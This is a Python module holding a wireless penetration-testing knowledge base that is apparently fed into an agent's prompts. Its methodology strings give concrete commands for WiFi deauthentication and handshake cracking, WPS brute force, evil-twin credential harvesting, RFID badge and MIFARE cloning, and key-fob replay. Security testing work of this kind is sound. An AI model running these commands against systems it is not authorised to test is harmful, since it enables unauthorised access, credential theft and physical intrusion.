"""Wireless security knowledge base.

Deep knowledge about wireless network security:
1. WiFi security testing
2. Bluetooth security
3. RFID/NFC security
4. Software-defined radio
5. Rogue access point detection
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class WirelessVulnPattern:
    """A wireless vulnerability pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    protocols: list[str] = field(default_factory=list)
    description: str = ""
    testing_methodology: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:30],
            "category": self.category[:12],
        }


WIRELESS_VULN_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "wl-001", "name": "WiFi Security Testing",
        "category": "wifi", "severity": "high",
        "protocols": ["WPA2", "WPA3", "WEP", "WPS", "802.11"],
        "desc": "WiFi network security assessment.",
        "testing": (
            "WIFI SECURITY TESTING:\n"
            "1. RECONNAISSANCE:\n"
            "   - Monitor mode:\n"
            "     airmon-ng start wlan0\n"
            "   - Scan networks:\n"
            "     airodump-ng wlan0mon\n"
            "   - Capture traffic for specific network:\n"
            "     airodump-ng -c {channel} --bssid {bssid} -w capture wlan0mon\n"
            "2. WPA/WPA2 ATTACKS:\n"
            "   - 4-way handshake capture:\n"
            "     * Wait for client connection OR\n"
            "     * Deauth to force reconnection:\n"
            "       aireplay-ng -0 5 -a {bssid} -c {client} wlan0mon\n"
            "   - PMKID attack (clientless):\n"
            "     hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng\n"
            "   - Crack handshake:\n"
            "     hashcat -m 22000 hash.hc22000 wordlist.txt\n"
            "     aircrack-ng -w wordlist.txt capture-01.cap\n"
            "3. WPA3 ATTACKS:\n"
            "   - Dragonblood vulnerabilities:\n"
            "     * Side-channel attacks on SAE handshake\n"
            "     * Downgrade attacks (WPA3→WPA2 transition mode)\n"
            "   - Timing attacks on SAE commit exchange\n"
            "4. WPS ATTACKS:\n"
            "   - PIN brute force:\n"
            "     reaver -i wlan0mon -b {bssid} -vv\n"
            "   - Pixie Dust (offline):\n"
            "     reaver -i wlan0mon -b {bssid} -K 1\n"
            "5. EVIL TWIN:\n"
            "   - Create rogue AP:\n"
            "     hostapd-wpe evil_twin.conf\n"
            "   - Captive portal for credential harvest\n"
            "   - MITM all traffic through rogue AP\n"
            "   - Tools: Wifiphisher, Fluxion\n"
            "6. ENTERPRISE (WPA2-Enterprise/802.1X):\n"
            "   - EAP downgrade attacks\n"
            "   - Rogue RADIUS server:\n"
            "     hostapd-wpe for credential capture\n"
            "   - Certificate validation bypass\n"
            "   - PEAP/MSCHAPv2 hash capture and crack"
        ),
        "tools": ["aircrack-ng", "hashcat", "reaver", "wifiphisher", "hostapd-wpe"],
    },
    {
        "id": "wl-002", "name": "Bluetooth Security",
        "category": "bluetooth", "severity": "high",
        "protocols": ["Bluetooth Classic", "BLE", "BR/EDR"],
        "desc": "Bluetooth security testing.",
        "testing": (
            "BLUETOOTH SECURITY TESTING:\n"
            "1. DISCOVERY & ENUMERATION:\n"
            "   - Classic Bluetooth scan:\n"
            "     hciconfig hci0 up\n"
            "     hcitool scan\n"
            "     hcitool inq\n"
            "   - BLE scan:\n"
            "     hcitool lescan\n"
            "     btlejack -s\n"
            "   - Service enumeration:\n"
            "     sdptool browse {mac}\n"
            "2. BLE ATTACKS:\n"
            "   - GATT service enumeration:\n"
            "     gatttool -b {mac} --primary\n"
            "     gatttool -b {mac} --characteristics\n"
            "   - Read/write characteristics:\n"
            "     gatttool -b {mac} --char-read -a {handle}\n"
            "     gatttool -b {mac} --char-write-req -a {handle} -n {value}\n"
            "   - BLE sniffing:\n"
            "     * Ubertooth One: ubertooth-btle -f -t {mac}\n"
            "     * nRF52840 dongle: BLE sniffer firmware\n"
            "   - MITM: BtleJuice proxy between device and phone\n"
            "3. KNOWN VULNERABILITIES:\n"
            "   - KNOB (Key Negotiation of Bluetooth):\n"
            "     Force 1-byte entropy in session key\n"
            "   - BLURtooth: Cross-transport key derivation\n"
            "   - SweynTooth: BLE stack implementation bugs\n"
            "   - BlueBorne: RCE over Bluetooth (CVE-2017-0781)\n"
            "   - BIAS: Bluetooth Impersonation Attacks\n"
            "4. PAIRING ATTACKS:\n"
            "   - JustWorks pairing: No user confirmation\n"
            "   - Passkey eavesdropping\n"
            "   - Legacy pairing PIN brute force:\n"
            "     btcrack captured_pairing.bin\n"
            "5. AUTOMOTIVE BLE:\n"
            "   - Key fob relay attacks\n"
            "   - BLE-based vehicle unlock interception\n"
            "   - Tire pressure monitoring system (TPMS) spoofing"
        ),
        "tools": ["bluez", "ubertooth", "btlejack", "BtleJuice", "gatttool"],
    },
    {
        "id": "wl-003", "name": "RFID/NFC Security",
        "category": "rfid", "severity": "high",
        "protocols": ["MIFARE", "HID", "iClass", "NFC", "ISO 14443"],
        "desc": "RFID and NFC security testing.",
        "testing": (
            "RFID/NFC SECURITY TESTING:\n"
            "1. CARD IDENTIFICATION:\n"
            "   - Proxmark3:\n"
            "     lf search    (low frequency: HID, EM, T55xx)\n"
            "     hf search    (high frequency: MIFARE, iClass, DESFire)\n"
            "   - Flipper Zero:\n"
            "     125kHz and 13.56MHz auto-detect\n"
            "   - NFC phone: NFC TagInfo app\n"
            "2. LOW FREQUENCY (125kHz):\n"
            "   - HID ProxCard II:\n"
            "     * Read: lf hid read\n"
            "     * Clone: lf hid clone -r {raw_data}\n"
            "     * Write to T5577: lf hid clone --t5577\n"
            "   - EM410x:\n"
            "     * Read: lf em 410x read\n"
            "     * Clone: lf em 410x clone -id {id}\n"
            "   - Long-range reader: Read badges from distance\n"
            "3. HIGH FREQUENCY (13.56MHz):\n"
            "   - MIFARE Classic:\n"
            "     * Default keys: hf mf chk --all\n"
            "     * Nested attack: hf mf nested --1k --blk 0 -a -k FFFFFFFFFFFF\n"
            "     * Hardnested: hf mf hardnested --blk 0 -a -k {known_key} --tblk 4 --ta\n"
            "     * Dump: hf mf dump\n"
            "     * Clone: hf mf cload -f dump.eml\n"
            "   - MIFARE DESFire:\n"
            "     * More secure, AES encryption\n"
            "     * Check default keys\n"
            "   - iClass:\n"
            "     * Read: hf iclass read\n"
            "     * Loclass attack for legacy cards\n"
            "4. NFC ATTACKS:\n"
            "   - NFC relay: NFCGate (Android app)\n"
            "   - NFC payment fraud: Contactless card skimming\n"
            "   - NDEF message injection: Malicious URLs/actions\n"
            "5. ACCESS CONTROL BYPASS:\n"
            "   - Credential cloning workflow:\n"
            "     Read → Analyze → Clone → Test\n"
            "   - Wiegand intercept: Tap into reader wiring\n"
            "   - Replay attacks on challenge-response systems"
        ),
        "tools": ["Proxmark3", "Flipper Zero", "libnfc", "mfoc", "mfcuk"],
    },
    {
        "id": "wl-004", "name": "Software Defined Radio",
        "category": "sdr", "severity": "medium",
        "protocols": ["GSM", "LTE", "DECT", "LoRa", "ADS-B", "AIS"],
        "desc": "SDR-based wireless security assessment.",
        "testing": (
            "SOFTWARE DEFINED RADIO SECURITY:\n"
            "1. HARDWARE:\n"
            "   - RTL-SDR (~$20): Receive 24-1766 MHz\n"
            "   - HackRF One (~$300): TX/RX 1-6000 MHz\n"
            "   - USRP: High-end software defined radio\n"
            "   - BladeRF: TX/RX with FPGA\n"
            "2. SIGNAL ANALYSIS:\n"
            "   - Spectrum scanning:\n"
            "     rtl_power -f 400M:500M:1k -i 10 -g 50 scan.csv\n"
            "   - Signal identification:\n"
            "     * SDR# or GQRX for visual spectrum analysis\n"
            "     * SigDigger for automated signal identification\n"
            "   - Modulation detection: AM, FM, FSK, PSK, QAM\n"
            "3. GSM/CELLULAR:\n"
            "   - GSM sniffing (downlink only with RTL-SDR):\n"
            "     grgsm_livemon -f {freq}\n"
            "   - IMSI catcher detection\n"
            "   - SMS interception (2G unencrypted)\n"
            "   - LTE: srsRAN for base station simulation\n"
            "4. KEY FOB / REMOTE:\n"
            "   - Capture: rtl_433 -f 433.92M -R 0\n"
            "   - Replay: hackrf_transfer -t capture.bin -f 433920000\n"
            "   - Rolling code analysis\n"
            "   - Jamming + capture (RollJam attack)\n"
            "5. SPECIFIC PROTOCOLS:\n"
            "   - DECT (cordless phones): Dedected + OsmocomDECT\n"
            "   - ADS-B (aircraft): dump1090 --net\n"
            "   - AIS (maritime): rtl_ais\n"
            "   - LoRa: LoRa demodulation plugins\n"
            "   - POCSAG/FLEX (pagers): multimon-ng\n"
            "6. JAMMING DETECTION:\n"
            "   - Monitor spectrum for anomalous power levels\n"
            "   - Detect selective jamming patterns"
        ),
        "tools": ["RTL-SDR", "HackRF", "GNU Radio", "GQRX", "rtl_433"],
    },
]


class WirelessSecurityKB:
    """Wireless security knowledge base.

    Provides wireless security testing methodology
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, WirelessVulnPattern] = {}
        self._log = logger.bind(component="wireless_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load wireless vulnerability patterns."""
        for data in WIRELESS_VULN_PATTERNS:
            pattern = WirelessVulnPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                protocols=data.get("protocols", []),
                description=data.get("desc", ""),
                testing_methodology=data.get("testing", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_patterns_for_category(
        self,
        category: str,
    ) -> list[WirelessVulnPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category == category
        ]

    def get_patterns_for_protocol(
        self,
        protocol: str,
    ) -> list[WirelessVulnPattern]:
        """Get patterns for a specific protocol."""
        return [
            p for p in self._patterns.values()
            if protocol.upper() in [pr.upper() for pr in p.protocols]
        ]

    def build_wireless_prompt(
        self,
        category: str = "",
        protocol: str = "",
        max_patterns: int = 3,
    ) -> str:
        """Build wireless testing prompt."""
        if category:
            relevant = self.get_patterns_for_category(category)
        elif protocol:
            relevant = self.get_patterns_for_protocol(protocol)
        else:
            relevant = list(self._patterns.values())

        lines = ["## Wireless Security Testing\n"]
        for pattern in relevant[:max_patterns]:
            lines.append(f"### {pattern.name} [{pattern.severity.upper()}]")
            if pattern.protocols:
                lines.append(f"Protocols: {', '.join(pattern.protocols)}")
            lines.append(pattern.testing_methodology)
            lines.append("")

        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = defaultdict(int)
        proto_set: set[str] = set()
        for p in self._patterns.values():
            cat_counts[p.category] += 1
            proto_set.update(p.protocols)
        return {
            "patterns": len(self._patterns),
            "protocols": len(proto_set),
            "by_category": dict(cat_counts),
        }
